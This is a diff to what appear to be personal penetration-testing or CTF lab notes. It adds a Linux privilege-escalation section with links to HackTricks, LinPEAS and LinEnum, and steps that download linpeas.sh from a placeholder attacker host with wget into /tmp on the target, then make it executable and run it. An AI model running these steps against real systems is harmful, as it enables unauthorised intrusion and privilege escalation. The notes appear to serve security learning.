@@ -404,7 +404,34 @@ After browsing through the webserver, we identify the home directory and the use
 ![[Pasted image 20251022194716.png]]
 
 # Privilege Escalation on Linux 
-We can use two useful scripts for Linux Priv Esc
 
-[Fetching Title#6esi](https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh)
+1. Hacktricks has useful PrivEsc resource for Linux
+[Linux Privilege Escalation - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
+
+2. We can use two useful scripts for Linux Priv Esc
+
+https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh
 [GitHub - rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
+
+## PrivEsc Using Linpeas
+1. We now have to host the linpeas.sh so that we can download on the target machine
+2. Navigate to the /tmp folder on the target machine 
+3. Once the file is hosted, we can download with the wget command
+
+```
+cd /tmp
+
+wget http://attacker_ip:LPORT/linpeas.sh
+```
+
+Make the file executable using the below
+```
+chmod +x linpeas.sh
+```
+
+We can now run it with
+```
+./linpeas.sh
+```
+## Running Linpeas.sh 
+![[Pasted image 20251022201118.png]]
